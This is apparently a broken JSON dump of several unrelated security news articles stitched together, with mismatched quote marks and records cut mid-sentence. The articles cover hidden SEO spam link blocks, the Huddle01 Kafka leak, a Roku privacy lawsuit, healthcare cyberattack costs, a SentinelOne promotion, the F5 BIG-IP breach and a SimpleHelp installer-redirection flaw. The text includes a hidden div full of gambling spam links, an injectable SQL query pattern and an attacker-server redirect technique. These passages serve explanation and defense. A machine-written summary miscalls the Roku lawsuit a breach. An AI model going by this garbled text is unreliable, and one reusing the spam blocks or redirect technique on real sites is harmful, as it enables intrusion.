content. It suggests an attempt to bypass the automated search engine filters that easily detect thedisplay:none;parameter.Let us analyze the set of CSS styles:<divstyle=\"overflow: auto; position: absolute; height: 0pt; width: 0pt;\">. The properties position:absolute;height:0pt;width:0pt;remove the block from the visible area of the page, while overflow: auto prevents the content from being displayed even if it exceeds zero dimensions. This makes the links inaccessible to humans, but it does not prevent them from being preserved in theDOM (document object model). That’s why HTML code scanning systems, such as search engines, are able to see it.In addition to the zero dimensions of the block, in this example, just as in the previous one, we see the attributerel=\"dofollow\", as well as many links to pornographic websites with relevant keywords.The combination of styles that sets the block dimensions to zero is less obvious thandisplay:none;because the element is technically present in the rendering, although it is not visible to the user. Nevertheless, it is worth noting that modern search engine security algorithms, such as Google Penguin, detect this technique too. To counter this, malicious actors may employ more complex techniques for evading detection.

These indicate that external JavaScript can dynamically control the page content, for example, by adding or changing hidden links, that is, modifying this block in real time.This is a more advanced approach than the ones in the previous examples. Yet it is also detected by filters responsible for identifying suspicious manipulations.Other parameters and attributes exist that attackers use to conceal a link block. These, however, can also be detected:the parametervisibility:hidden;can sometimes be seen instead ofdisplay:none;.Withinposition:absolute;, the block with hidden links may not have a zero size, but rather be located far beyond the visible area of the page. This can be set, for example, via the propertyleft:-9232px;, as in the example below.<div style=\"position: absolute; left: -9232px\">\n<a href=\"https://romabet.cam/\">روما بت</a><br>\n<a href=\"https://mahbet.cam/\">ماه بت</a><br>\n<a href=\"https://pinbahis.com.co/\">پین باهیس</a><br>\n<a href=\"https://bettingmagazine.org/\">بهترین سایت شرط بندی</a><br>\n<a href=\"https://1betcart.com/\">بت کارت</a><br>\n<a href=\"https:// yasbet.com.co/\">یاس بت</a><br>\n<a href=\"https://yekbet.cam/\">یک بت</a><br>\n<a href=\"https://megapari.cam/\">مگاپاری </a><br>\n<a href=\"https://onjabet.net/\">اونجا بت</a><br>\n<a href=\"https://alvinbet.org/\">alvinbet.org</a><br>\n<a href=\"https://2betboro.com/\">بت برو</a><br>\n<a href=\"https://betfa.cam/\">بت فا</a><br>\n<a href=\"https://betforward.help/\">بت فوروارد</a><br>\n<a href=\"https://1xbete.org/\">وان ایکس بت</a><br>\n<a href=\"https://1win-giris.com.co/\">1win giriş</a><br>\n<a href=\"https://betwiner.org/\">بت وینر</a><br>\n<a href=\"https://4shart.com/\">بهترین سایت شرط بندی ایرانی</a><br>\n<a href=\"https://1xbetgiris.cam\">1xbet giriş</a><br>\n<a href=\"https://1kickbet1.com/\">وان کیک بت</a><br>\n<a href=\"https://winbet-bet.com/\">وین بت</a><br>\n<a href=\"https://ritzobet.org/\">ریتزو بت</a><br>How attackers place hidden links on other people’s websitesTo place hidden links, attackers typically exploit website configuration errors and vulnerabilities. This may be a weak or compromised password for an administrator account, plugins or an engine that have not been updated in a long time, poor filtering of user inputs, or security issues on the hosting provider’s side. Furthermore, attackers may attempt to exploit the human factor, for example, by setting up targeted or mass phishing attacks in the hope of obtaining the website administrator’s credentials.Let us examine in detail the various mechanisms through which an attacker gains access to editing a page’s HTML code.Compromise of the administrator password. An attacker may guess the password, use phishing to trick the victim into giving it away, or steal it with the help of malware. Furthermore, the password may be found in a database of leaked credentials. Site administrators frequently use simple passwords for control panel protection or, even worse, leave the default password, thereby simplifying the task for the attacker.After gaining access to the admin panel, the attacker can directly edit the page’s HTML code or install their own plugins with hidden SEO blocks.Exploitation of CMS (WordPress, Joomla, Drupal) vulnerabilities. If the engine or plugins are out of date, attackers use known vulnerabilities (SQL Injection, RCE, or XSS) to gain access to the site’s code. After that, depending on the level of access gained by exploiting the vulnerability, they can modify template files (header.php, footer.php, index.php, etc.), insert invisible blocks into arbitrary site pages, and so on.In SQL injection attacks, the hacker injects their malicious SQL code into a database query. Many websites, from news portals to online stores, store their content (text, product descriptions, and news) in a database. If an SQL query, such asSELECT *FROMpostsWHEREid='$id'allows passing arbitrary data, the attacker can use the$idfield to inject their code. This allows the attacker to change the content of records, for example, by inserting HTML with hidden blocks.In RCE (remote code execution) attacks, the attacker gains the ability to run their own commands on the server where the website runs. Unlike SQL injections, which are limited to the database, RCE provides almost complete control over the system. For example, it allows the attacker to create or modify site files, upload malicious scripts, and, of course, inject invisible blocks.In an XSS (cross-site scripting) attack, the attacker injects their JavaScript code directly into the web page by using vulnerable input fields, such as those for comments or search queries. When another user visits this page, the malicious script automatically executes in their browser. Such a script enables the attacker to perform various malicious actions, including stealthily adding a hidden<div>block with invisible links to the page. For XSS, the attacker does not need direct access to the server or database, as in the case with SQL injection or RCE; they only need to find a single vulnerability on the website.An attack via the hosting provider. In addition to directly hacking the target website, an attacker may attempt to gain access to the website through the hosting environment. If the hosting provider’s server is poorly secured, there is a risk of it being compromised. Furthermore, if multiple websites or web applications run on the same server, a vulnerability in one of them can jeopardize all other projects. The attacker’s capabilities depend on the level of access to the server. These capabilities may include: injecting hidden blocks into page templates, substituting files, modifying databases, connecting external scripts to multiple websites simultaneously, and so forth. Meanwhile, the website administrator may not notice the problem because the vulnerability is being exploited within the server environment rather than the website code.Note that hidden links appearing on a website is not always a sign of a cyberattack. The issue often arises during the development phase, for example, if an illegal copy of a template is downloaded to save money or if the project is executed by an unscrupulous web developer.Why attackers place hidden blocks on websitesOne of the most obvious goals for injecting hidden blocks into other people’s websites is to steal the PageRank from the victim. The more popular and authoritative the website is, the more interesting it is to attackers. However, this does not mean that moderate- or low-traffic websites are safe. As a rule, administrators of popular websites and large platforms do their best to adhere to security rules, so it is not so easy to get close to them. Therefore, attackers may target less popular – and less protected – websites.As previously mentioned, this approach to promoting websites is easily detected and blocked by search engines. In the short term, though, attackers still benefit from this: they manage to drive traffic to the websites that interest them until search engine algorithms detect the violation.Even though the user does not see the hidden block and cannot click the links, attackers can use scripts to boost traffic to their websites. One possible scenario involves JavaScript creating an iframe in the background or sending an HTTP request to the website from the hidden block, which then receives information about the visit.Hidden links can lead not just to pornographic or other questionable websites but also to websites with low-quality content whose sole purpose is to be promoted and subsequently sold, or to phishing and malicious websites. In more sophisticated schemes, the script that provides “visits” to such websites may load malicious code into the victim’s browser.Finally, hidden links allow attackers to lower the reputation of the targeted website and harm its standing with search engines. This threat is especially relevant in light of the fact that algorithms such as Google Penguin penalize websites hosting questionable links. Attackers may use these techniques as a tool for unfair competition, hacktivism, or any other activity that involves discrediting certain organizations or individuals.Interestingly, in 2025, we have more frequently encountered hidden blocks with links to pornographic websites and online casinos on various legitimate websites. With low confidence, we can suggest that this is partly due to the development of neural networks, which make it easy to automate such attacks, and partly due to the regularupdates to Google’s anti-spam systems, the latest of which was completed at the end of September 2025: attackers may have rushed to maximize their gains before the search engine made it a little harder for them.Consequences for the victim websiteThe consequences for the victim website can vary in severity. At a minimum, the presence of hidden links placed by unauthorized parties hurts search engine reputation, which may lead to lower search rankings or even complete exclusion from search results. However, even without any penalties, the links disrupt the internal linking structure because they lead to external websites and pass on a portion of the victim’s weight to them. This negatively impacts the rankings of key pages.Although unseen by visitors, hidden links can be discovered by external auditors, content analysis systems, or researchers who report such findings in public reports. This is something that can undermine trust in the website. For example, sites where our categorization engine detects links to pornography pages will be classified as “Adult content”. Consequently, all of our clients who use web filters to block this category will be unable to visit the website. Furthermore, information about a website’s category is published on ourKaspersky Threat Intelligence Portaland available to anyone wishing to look up its reputation.If the website is being used to distribute illegal or fraudulent content, the issue enters the legal realm, with the owner potentially facing lawsuits from copyright holders or regulators. For example, if the links lead to websites that distribute pirated content, the site may be considered an intermediary in copyright infringement. If the hidden block contains malicious scripts or automatic redirects to questionable websites, such as phishing pages, the owner can be charged with fraud or some other cybercrime.How to detect a hidden link block on your websiteThe simplest and most accessible method for any user to check a website for a hidden block is to view its source code in the browser. This is very easy to do. Navigate to the website, press Control+U, and the website’s code will open in the next tab. Search (Control+F) the code for the following keywords:display:none,visibility:hidden,opacity:0,height:0,width:0,position:absolute. In addition, you can check for keywords that are characteristic of the hidden content itself. When it comes to links that point to adult or gambling sites, you should look forporn,sex,casino,card, and the like.A slightly more complex method is using web developer tools to investigate the DOM for invisible blocks. After the page fully loads, open DevTools (F12) in the browser and go to the Elements tab. Search (Control+F) for keywords such as<a,iframe,display:none,hidden,opacity. Hover your cursor over suspicious elements in the code so the browser highlights their location on the page. If the block occupies zero area or is located outside the visible area, that is an indicator of a hidden element. Check the Computed tab for the selected element; there, you can see the applied CSS styles and confirm that it is hidden from the user’s view.You can also utilize specialized SEO tools. These are typically third-party solutions that scan website SEO data and generate reports. They can provide a report about suspicious links as well. Few of them are free, but when selecting a tool, you should be guided primarily by the vendor’s reputation rather than price. It is better to use tried-and-true, well-known services that are known to be free of malicious or questionable payloads. Examples of these trusted services include Google Search Console, Bing Webmaster Tools, OpenLinkProfiler, and SEO Minion.Another way to discover hidden SEO spam on a website is to check the CMS itself and its files. First, you should scan the database tables for suspicious HTML tags with third-party links that may have been inserted by attackers, and also carefully examine the website’s template files (header.php, footer.php, and index.php) and included modules for unfamiliar or suspicious code. Pay particular attention to encrypted insertions, unclear scripts, or links that should not originally be present in the website’s structure.Additionally, you can look up your website’s reputation on theKaspersky Threat Intelligence Portal. If you find it in an uncharacteristic category – typically “Adult content”, “Sexually explicit”, or “Gambling” – there is a high probability that there is a hidden SEO spam block embedded in your website.How to protect your websiteTo prevent hidden links from appearing on your website, avoid unlicensed templates, themes, and other pre-packaged solutions. The entire site infrastructure must be built only on licensed and official solutions. The same principle applies to webmasters and companies you hire to build your website: we recommend checking their work for hidden links, but also for vulnerabilities in general. Never cut corners when it comes to security.Keep your CMS, themes, and plugins up to date, as new versions often patch known vulnerabilities that attackers can exploit. Delete any unused plugins and themes, if any. The less unnecessary components are installed, the lower the risk of an exploit in one of the extensions, plugins, and themes. It is worth noting that this risk never disappears completely – it is still there even if you have a minimal set of components as long as they are outdated or poorly secured.To protect files and the server, it is important to properly configure access permissions. On servers running Linux and other Unix-like systems, use644for files and755for folders. This means that the owner can open folders, and read and modify folders and files, while the group and other users can only read files and open folders. If write access is not necessary, for example in template folders, forbid it altogether to lower the risk of malicious actors making unauthorized changes. Furthermore, you must set up regular, automatic website backups so that data can be quickly restored if there is an issue.Additionally, it is worth using web application firewalls (WAFs), which help block malicious requests and protect the site from external attacks. This solution is available inKaspersky DDoS Protection.To protect the administrator panel, use only strong passwords and 2FA (Two-Factor Authentication) at all times. You would be well-advised to restrict access to the admin panel by IP address if you can. Only a limited group of individuals should be granted admin privileges.",

      "content": "TheCybernewsresearch team found that video call app Huddle01 exposed email addresses, real names, and other identifiers through an unprotected Kafka broker.Think of an unprotected Kafka broker like a post office that stores and delivers confidential mail. Now, imagine the manager leaves the front doors wide open, with no locks, guards, or ID checks. Anyone can walk in, look through private letters and photos, and grab whatever catches their eye.Huddle01 is a video call app that focuses on decentralized Web Real-Time Communication (WebRTC). WebRTC is appealing because it lets people talk and share data directly between devices without using a central server. Done right, this can reduce latency, cut costs, and improve privacy.But leaving your Kafka broker open to anyone who happens to stumble upon it does not qualify as “doing privacy right.” The Kafka broker operated without authentication or encryption, meaning anyone could listen in, collect logs, or potentially alter data if write access existed. This demonstrates a fundamental misconfiguration that puts both users and the platform at risk.The Kafka instance contained over 621,000 log entries from the last 13 days, belonging to Huddle01, including:Usernames (sometimes real names)Email addressesCrypto wallet addresses (Huddle01 supports many wallets across blockchains like Bitcoin and Ethereum)Detailed activity data, such as which users joined specific calls, participants in each call, country, time, date, and durationOther identifiersThe app is popular among cryptocurrency users, but in this case the open Kafka instance could have deanonymized their wallets by tying their crypto wallets to usernames and email addresses. Which also paints a target on their back as potentially high-value targets.It also makes users more vulnerable to social engineering since attackers can craft credible emails or messages using real names and meeting data.And hold on for the worst part. Cybernews states it responsibly disclosed the data leak to the company behind Huddle01…“However, it did not respond to the initial disclosure and subsequent attempts. After one month, the exposed server remained accessible. It’s unclear how many other third parties might have accessed the data.”Security tips for affected usersKnowing that the exposed information goes back about two weeks doesn’t help much, since anyone with access could have set up a data collector, listening in on the real-time data streaming and processing going on.So, any Huddle01 users should:Change passwords on accounts linked to the exposed email or username, and use strong, unique passwords for each site.Set uptwo-factor authentication (2FA)wherever possible to prevent unauthorized access.Monitor inboxes for suspicious messages. Be extra cautious of emails or texts asking for crypto transactions or sensitive information, as targeted phishing is a possibility. Be especially wary of social engineering attempts that reference details from meeting logs, such as who you spoke to or when meetings occurred.Stay updated on official statements from Huddle01 or news coverage, as they may release more guidance later.Pro tip:Did you know that you can submit suspicious messages like these to Malwarebytes Scam Guard, which instantly flags known scams?We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

      "summary": "The exposure of over 600,000 user logs from the video call app Huddle01 highlights a significant data breach that affects not only the platform's users but also their privacy and security. The unsecured Kafka broker served as a gateway for unauthorized access to sensitive information including email addresses, real names, crypto wallet addresses, and detailed activity data. This misconfiguration not only compromises user confidentiality but also exposes them to potential social engineering attacks and phishing scams. Moreover, the lack of response from Huddle01 after responsible disclosure raises concerns about their commitment to cybersecurity practices and customer privacy.",

      "content": "The state of Florida has accused Roku, which powers many smart TVs and streaming devices, of selling children’s data to third parties without their consent. According to the Florida Attorney General James Uthmeier, Roku collected viewing habits, voice recordings, and precise geolocation from kids without approval from parents.Roku, which reaches around 145 million people across half of US households, allegedly gathered children’s data despite clear signals that the viewers were minors, the AG said.After collecting the data, Roku made it available to advertisers and sold it to data brokers, including Kochava, according to the Florida government. Kochava is already facing its own lawsuit from the Federal Trade Commission, which claims the company sells highly sensitive consumer information.Uthmeier’s office said in anews release:“The State contends that Roku’s practices violated Florida’s privacy and consumer-protection laws by failing to obtain parental consent before selling or processing children’s data and by misrepresenting the effectiveness of its privacy controls and opt-out tools.”In the complaint filed in court, the AG’s office accused Roku of turning a blind eye to the collection of minors’ data.“Roku knows that some of its users are children but has consciously decided not to implement industry-standard user profiles to identify which of its users are children.”The lawsuit claims Roku ignored obvious indicators, such as when users installed its Kids Screensaver or Kids Theme Pack products.Uthmeier’s office also said that although Roku sells deidentified data to brokers (that is, data that has identifying information removed), it’s still possible for brokers like Kochava to reidentify users. Brokers often have troves of information of their own, such as device IDs linked to potentially identifying information, which can allow them to match records to specific people.Florida has filed the lawsuit under the Florida Digital Bill of Rights (FDBR), which came into effect on July 1, 2024. The law protects Florida residents’ privacy, including children’s data rights, and gives parents the ability to opt out of data processing for their kids.The penalty for violating the FDBR is up to $50,000 per violation, but that triples for violations where the consumer involved is a known child. That includes cases of “willful disregard of a child’s age.”This isn’t the only case that Roku must navigate in court. In April, Michigan Attorney General Dana Nessel alsosued Rokufor similar violations, accusing it of violating laws including the Children’s Online Privacy Protection Act (COPPA), along with federal and state privacy laws. Roku is fighting the suit.Smart TV advertising is big business in the US. So much, in fact, that Roku appears to sell its devices at a loss to power its platform revenues, which include not just subscriptions, but advertising. In fiscal 2024, itlost$80.3 million on device sales, up from $43.9 million in device-based losses the prior year. Yet it made $1.9 billion profit from its platform business, up from $1.567 billion in 2023.According toreports, Roku’s Automatic Content Recognition (ARC) technologycapturesthousands of images each hour from smart TVs. These can be used to help track viewing activity.In January, Roku launched its Data Cloud, a service that allows its partners to use the company’s proprietary TV data. It was the latest step in a multi-year strategy to build out its data offering. In 2022, itlauncheda ‘clean room’ product that allowed other companies to combine their data with Roku’s own, conducting queries about viewer behavior while preserving privacy (this is how companies access its Data Cloud). Then, in 2024, it launched Roku Exchange—an advertising hub for partners.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline.

This breach not only affects individual user trust but also impacts Roku's brand reputation and compliance with legal standards. The collection of detailed viewing habits, voice recordings, and precise geolocation from children through smart TVs and streaming devices raises significant concerns about data protection and parental control. Moreover, the accusation that Roku failed to implement adequate privacy controls and opt-out tools highlights a gap in user privacy settings.

This was an average of 43 attacks per organization, up from the average of 40 attacks in 2024.\nThe report details how these attacks are not only costing health systems millions but also disrupting patient care.\nWhy It Matters\nIn a\nstatement\n, Proofpoint’s Vice President of Industry Solutions Ryan Witt said patient safety is “inseparable from cyber safety.”\n“This year’s report highlights a stark reality: cyber threats aren’t just IT issues, they’re clinical risks,” he said. “When care is delayed, disrupted or compromised due to a cyberattack, patient outcomes are impacted, and lives are potentially put at risk.”\nCanva\nData breaches due to cyberattacks expose patients’ sensitive personal, financial and medical data, putting them at risk for identity theft and fraud.\nThey also cost health systems millions. The report, which was published earlier this month, found that the average cost of the most significant attack decreased to $3.9 million.\nOperational disruptions were the most expensive result of cyberattacks, the report found, followed by lost productivity, cost of the time required to correct patient care impacts, damage or theft of IT assets and infrastructure and remediation and technical support.\nRecent class action lawsuits from data breach victims led to major settlements.\nIntegris Health\nand\nEastern Radiology\nare just two of the latest cases. The Integris Health case, for example, resulted in a $30 million payout to more than two million patients impacted by both the data breach and later extortion from the cybercriminal responsible.\nWhat To Know\nThe report also specifically highlights how cyberattacks affect patient care at health systems.\nIt found that 72 percent of healthcare organizations that experienced common cyberattacks in the last 12 months suffered disruptions to patient care. This was up from 69 percent last year. These attacks include ransomware, cloud compromise, supply-chain attacks and business email compromise.\nSuch disruptions cause various disruptions, including increased complications from medical procedures, longer stays, delays in tests and procedures, and increases both in patient transfers and in mortality rates.\nFor the first time, the survey asked respondents about their plans to secure clinical operations in the cloud. In total, 75 percent of respondents said they have moved or plan to move clinical operations to the cloud.\n“This accelerating shift toward cloud-hosted clinical systems underscores the urgency of addressing cloud/account compromise risks, given the potential impact on patient care and service continuity,” the report said in its executive summary.\nWhat Happens Next\nHuman error was mostly to blame for these frequent cybersecurity breaches, the report found.\nThirty-five percent of respondents said employees not following policies were the cause of data loss or exfiltration. Other reasons include privileged-access abuse and employees emailing sensitive patient information to wrong recipients.\nNew technology also remains a top safety concern for health systems, with 55 percent saying they are worried about the risk of insecure mobile apps and 38 percent calling out generative AI or other AI tools as cybersecurity concerns.\nAs a result of these concerns, the report found that health systems are spending more. The average annual IT budget was $65 million, with 21 percent of that budget dedicated to information security.\nThey are also taking steps to increase employee awareness of cybersecurity threats with regular training and employee monitoring.\nWhat People Are Saying\nProofpoint’s Ryan Witt said this report “underscores the urgent need for healthcare organizations to adopt a human-centric cybersecurity approach—one that not only protects systems and data but also preserves the continuity and quality of care.”\nDr. Larry Ponemon, the chairman and founder of the Ponemon Institute, said this year’s findings from Proofpoint are “a wake-up call” for the healthcare industry.\n“The root cause of many incidents lies in human factors—negligence, insider risk, and gaps in cyber awareness,” he said in a statement. “Cyberattacks are now routinely affecting patient safety, and while security spending is up, many organizations still lack clear leadership and internal expertise to meet the challenge.”\nRequest Reprint & Licensing\nSubmit Correction\nView Editorial & AI Guidelines\nAdd Newsweek as a preferred source on Google to see more of our trusted coverage when you search.\nTrending\nWeather\nWinter Weather Warning As 20 Inches of Snow To Hit\n4\nmin read\nCBP\nDHS Issues New Travel Rule for All Foreigners, Including Green Card Holders\n3\nmin read\nCalifornia\nRepublican Takes Lead in New California Governor Race Poll\n6\nmin read\nWeather\nWinter Weather Warning as 16 Inches of Snow To Hit This Weekend\n3\nmin read\nWhite House\nDonald Trump Chooses Name for New Ballroom: Report\n6\nmin read",

      "content": "Regulatory compliance has never been more critical, or more complex, for organizations operating in a cloud-first world. As companies increasingly adopt and reap the benefits of the cloud, the challenge evolves from meeting established industry compliance requirements to keeping pace with ever-changing regulations and unique internal standards for each company.Many CISOs are finding that standardized frameworks and benchmarks like NIST, HIPAA, GDPR, and more do not always adequately reflect their organization’s specific risk profile or business needs. Organizations need to define their own unique standards and requirements their cloud environments must adhere to, ensuring enhanced security and competitiveness in the market.This blog breaks down why tailored compliance is a critical need for CISOs and how new custom compliance capabilities in SentinelOne’sSingularity Cloud Securityaddress the full spectrum of compliance needs security leaders face.Compliance and Customization: Where One-Size-Fits-All Falls ShortWith cloud innovation spurring a great migration from on-prem environments to the cloud, it’s obvious that regulators as well as operators must follow some standard best practices, or compliance frameworks. However, despite the universal expectation for rigorous compliance, the path to achieving airtight compliance is anything but standard because each organization has its own unique set of technical, operational, and regulatory considerations.SentinelOne is proud to announce new custom compliance capabilities Singularity Cloud Security to help address this challenge. Custom compliance gives organizations the ability to define their own security and compliance controls and enforce those controls across their entire cloud environment.Whether you’re an organization solving for internally defined requirements that out-of-the-box tools can’t address, a global enterprise that must ensure compliance across overlapping regulatory frameworks, or a business with client-specific obligations, this new capability delivers automated, unified, and continuously monitored compliance workflows, now tailored precisely to your operational needs and regulatory obligations.To bring this to life, several real-world scenarios where custom compliance controls prove especially beneficial include the following:Organizations operating in multiple geographies or industries like SaaS providers or payment processors navigating a complex mix of industry, regional, and contractual regulations, canseamlessly layer and integrate multiple frameworks, mapping controls, assigning ownership by business unit or geography, and monitoring adherence through a unified dashboard.Healthcare systems often have unique, internally defined requirements including the need for bespoke access tracking or advanced activity logging beyond HIPAA mandates. Healthcare providers cancreate unique controls within the platform, eliminating the need for manual workaroundsand ensuring that even the most specialized requirements are continuously monitored and auditable.Financial services firms canautomate compliance evidence collection and tailor monitoring to their specific risk models or proprietary business logic, reducing redundant or unnecessary requirementsand making it easier to demonstrate compliance with the exact combination of regulations that apply to each part of their organization.Custom Compliance in ActionEase of use is paramount for any compliance capability, especially for creating your own unique custom controls. CISOs and security leaders can define complex compliance controls specific to their own organization with literally a few clicks.To start defining a custom compliance framework, users can navigate to the compliance dashboard within the Singularity SOC and click on “Create framework”.https://www.sentinelone.com/wp-content/uploads/2025/09/Custom-Compliance-Clip-1_1.mp4Any new framework is structured to have a hierarchy of controls, sub-controls, and rules. Once a new framework has been named and a description added for future users, there are two ways of populating the framework with compliance rules.Users can either pick specific rules/sub-controls/controls from more than 45 existing compliance frameworks like HIPAA, CIS, NIST, and others, or they can create their own custom controls, sub-controls, and add rules.This enables organizations to assemble truly bespoke compliance frameworks by seamlessly blending controls from multiple standards with their own specialized rules, giving them unparalleled flexibility to address unique regulatory and business needs.https://www.sentinelone.com/wp-content/uploads/2025/09/Custom-Compliance-Clip-2.mp4Users can also schedule compliance reports directly from the Reports page, making it easy to set up recurring, detailed reports. Gain timely insights into your cloud security posture, simplify audit readiness, and continuously monitor and strengthen compliance—no manual effort required.https://www.sentinelone.com/wp-content/uploads/2025/09/Custom-Compliance-Clip-3.mp4The ability to deploy custom compliance controls with the same ease as standard frameworks greatly simplifies ongoing compliance for organizations. This proactive stance both satisfies auditors and regulators and empowers the business to move faster, innovate securely, and maintain trust with stakeholders.Custom Compliance, Real ConfidenceCustom compliance gives organizations greater flexibility and control over their security and compliance programs. This isn’t just technical capability—it’s a strategic shift. Instead of relying solely on preset industry frameworks, teams can establish requirements that directly reflect their business goals, unique risks, and internal obligations, all while eliminating manual processes and streamlining monitoring and reporting.Singularity Cloud Securitystands out as the only cloud security solution that empowers organizations to transform compliance from an obstacle into a driver of clarity, trust, and business acceleration.Learn MoreCheck out the Singularity Cloud Security product tourLearn more about SentinelOne’s CNAPP solutionRead the 2025 Cloud Security Survey ReportGet a 30 minute demo from a SentinelOne expertSee SentinelOne in ActionDiscover how AI-powered cloud security can protect your organization in a one-on-one demo with a SentinelOne product expert.Get a Demo",

      "content": "Partnering with an EDR vendor after a nation-state has already stolen your source code isn’t innovation — it’s a gamble. You don’t build a fire extinguisher while the house is burning. You find every spark before it becomes the next inferno.Key takeaways:F5’s BIG-IP is used to secure everything from government agencies to critical infrastructure.The theft of BIG-IP source code and undisclosed vulnerabilities by a nation-state actor is a five-alarm fire for national security and puts all organizations at risk.We provide detailed steps Tenable customers can take immediately, as well as general guidance on how organizations can protect themselves now and in the long term.The breach of F5’s BIG-IP product development environment is a five-alarm fire for national security and once again raises doubts about the safety of the software supply chain.Among the data stolen in the nation-state attack: source code for BIG-IP networking solutions as well as undisclosed security vulnerabilities that were under investigation. According toF5’s October 15 8-K filing with the U.S. Securities and Exchange Commission(SEC), some of the exfiltrated files from its knowledge management platform contained configuration or implementation information for a small percentage of customers. The company alsorotated its signing certificates and keyson October 13.F5’s BIG-IP isn't just another piece of software. It is a foundational element in the technology stack used to secure everything from government agencies to critical infrastructure. In the hands of a hostile actor, this stolen data is a master key that could be used to launch devastating attacks, similar to the campaigns waged bySalt TyphoonandVolt Typhoon. We haven’t seen a software supply chain compromise of this scale sinceSolarWinds.The implications are far-reaching. BIG-IP is used by approximately57,000 companies; while the majority are in the $1 million – $10 million revenue range, F5 says its products areused by 85% of the Fortune 500. Affected products include BIG-IP (F5OS), BIG-IP (TMOS), Virtual Edition (VE), BIG-IP Next, BIG-IQ, and BIG-IP Next for Kubernetes (BNK) / Cloud-Native Network Functions (CNF).For a full list of CVEs associated with this incident, seeFrequently Asked Questions About The August 2025 F5 Security Incident.While F5 has not observed evidence of modified source code or a supply-chain attack, the stolen data could potentially be used to develop new exploits for unpatched vulnerabilities. In response, F5 released security patches on October 15.The U.S. Cybersecurity and Infrastructure Security Agency (CISA) issued anemergency directiverequiring that all organizations with F5 products apply these updates immediately. “The alarming ease with which these vulnerabilities can be exploited by malicious actors demands immediate and decisive action from all federal agencies,” said CISA Acting Director Madhu Gottumukkala in afollow-up statement. “These same risks extend to any organization using this technology, potentially leading to a catastrophic compromise of critical information systems. We emphatically urge all entities to implement the actions outlined in this Emergency Directive without delay.” The U.K.’sNational Cyber Security Center (NCSC) also issued an alertabout the incident.This incident does not affect Tenable products but we have released new plugins and additional guidance to help organizations secure their environments.Organizations using F5 BIG-IP are advised to update the software as soon as possible, harden any public-facing BIG-IP devices, and remove any unsupported devices from their networks. The company said it is “partnering with CrowdStriketo extend Falcon EDR sensors and Overwatch Threat Hunting to BIG-IP for additional visibility and to strengthen defenses. An early access version will be available to BIG-IP customers and F5 will provide all supported customers with a free Falcon EDR subscription.”While we applaud F5’s transparency and efforts to help organizations respond to the incident, this is not the time for experimentation. You don’t build a fire extinguisher while your house is burning. Likewise, waiting for an endpoint detection and response (EDR) vendor to build a solution after a threat actor has already accessed your most sensitive environment is ill-advised. The nation-state actor has been embedded in F5’s environment for some time, with access to highly sensitive data. They can act on what they’ve accessed at any time. Moreover, threat actors have repeatedly demonstrated their ability to disable EDR tools, thereby evading endpoint-based detection methods and rendering them largely useless.The following key actions required by CISA in its mitigation guidance extend well beyond the capabilities of EDR:Inventory: Identify all instances of F5 BIG-IP hardware devices and F5OS, BIG-IP TMOS, Virtual Edition, BIG-IP Next, BIG-IP IQ software, and BNK / CNF.Harden public-facing hardware and software appliances: Identify if physical or virtual BIG-IP devices exposed to the public internet provide public access to the networked management interface.Update instances of BIG-IP hardware and software applications:  Apply thelatest vendor updatesby Oct. 22, 2025, for the following products: F5OS, BIG-IP TMOS, BIG-IQ, and BNK / CNF — validate the F5 published MD5 checksums for its software image files and other F5 downloaded software. For other devices, update with the latest software release by Oct. 31, 2025, and apply the latest F5-provided asset hardening guidance.Disconnect end-of-support devices: Disconnect all public-facing F5 devices that have reached their end-of-support date. Report mission-critical exceptions to CISA.Mitigate against cookie leakage: If CISA notifies an agency of a BIG-IP cookie leakage vulnerability, the agency shall follow CISA’s accompanying mitigation instructions.Report: Submit a complete inventory of F5 products and actions taken to CISA by 11:59 p.m. EDT, Oct. 29, 2025.We cannot stress enough the importance of finding and fixing the 44 CVEs associated with this incident immediately. Doing so requires visibility into areas of your infrastructure that can’t be reached by the “good enough” vulnerability scanning tools available from endpoint vendors. The immediate need is for effective triage.Below, we provide detailed guidance on steps Tenable customers can take immediately. (Non-Tenable customers can start a free trial ofTenable Vulnerability Managementtoday to see where they’re impacted so they can swiftly take action.)Longer term, organizations need to prepare for the likelihood of nation-state actors leveraging additional F5 vulnerabilities for initial access, after which they will pivot to Living off the Land techniques to stealthily execute commands, establish persistence, move laterally, and escalate privileges. We’ve seen examples of such activity with Salt Typhoon and Volt Typhoon. Once it occurs, it becomes very difficult to detect and eradicate the actor.

      "content": "Tenable Research found two flaws in SimpleHelp’s remote-support tool that can be chained together to gain remote code execution on clients' devices. SimpleHelp has patched them: CVE-2025-36728 in version 5.5.11 and CVE-2025-36727 in version 5.5.12.Key takeawaysMake sure SimpleHelp is on the latest version to stay protected.Only download support tools from trusted sources.Watch for unusual activity when using remote support tools.Remote support tools are essential software that allow IT professionals to remotely access and control devices for technical assistance and maintenance. While they offer features like screen sharing and file transfer, they are a major security risk, as their compromise could grant attackers widespread access and privileges across an entire network.In this blog, we’ll describe our discovery oftwo vulnerabilities in SimpleHelp’s eponymous remote support tool. When chained, these vulnerabilities could provide a direct path from a click on a malicious URL to remote code execution (RCE). Here’s how these vulnerabilities work and how they can be connected together to achieve RCE on devices of IT support staff and end users.How does SimpleHelp work?At a high level, here’s how SimpleHelp works:Server component: Organizations run a SimpleHelp web server (on-premises or hosted) that brokers connections.Technician console: IT staff use the Technician Console desktop app to connect, transfer files or take remote control.Customer client / installer: End users download a support app via a link, which then connects back to the SimpleHelp server.Unattended access: Persistent agents can be installed for always-on access.Update and installer distribution: The platform regularly fetches binaries and config files from the server to bootstrap sessions.This design makes SimpleHelp convenient, but it also creates a critical trust boundary around installers and configuration files. Let’s look at how clients obtain the remote-support installers and how those applications interact with the server.Cross-site request forgery in hostname parameter (CVE-2025-36728)If a client wants to get remote support, they are directed to the/customerpath, where they will see a “Download Remote Support” button. If we click on this, we are directed to this URL: https://<SERVER-ADDRESS>/customer/Remote%20Support-windows64-offline.exe?language=en&hostname=https%3A%2F%2F<SERVER-ADDRESS>SimpleHelp client download portalWhen we first saw this, it seemed unusual for there to be a hostname parameter that specifies a URL. This made us think of previous server-side request forgery (SSRF) vulnerability findings that involved a URL parameter accepting an address that the server would then reach out to.By changing this value to that of a webserver we controlled on a different address, we noticed that when the installer was run, it would connect to our fake server and start requesting resources to carry out the installation.Python3 http.server logsFrom this, it became clear that the hostname parameter accepts custom values which determine where the installer reaches out for additional files required for the installation of the client software. An attacker could craft a link that silently redirects the client to their own server where they can host their own malicious files.In order to impersonate a SimpleHelp server, we leveraged Python'shttp.servermodule. Note that our server responded with 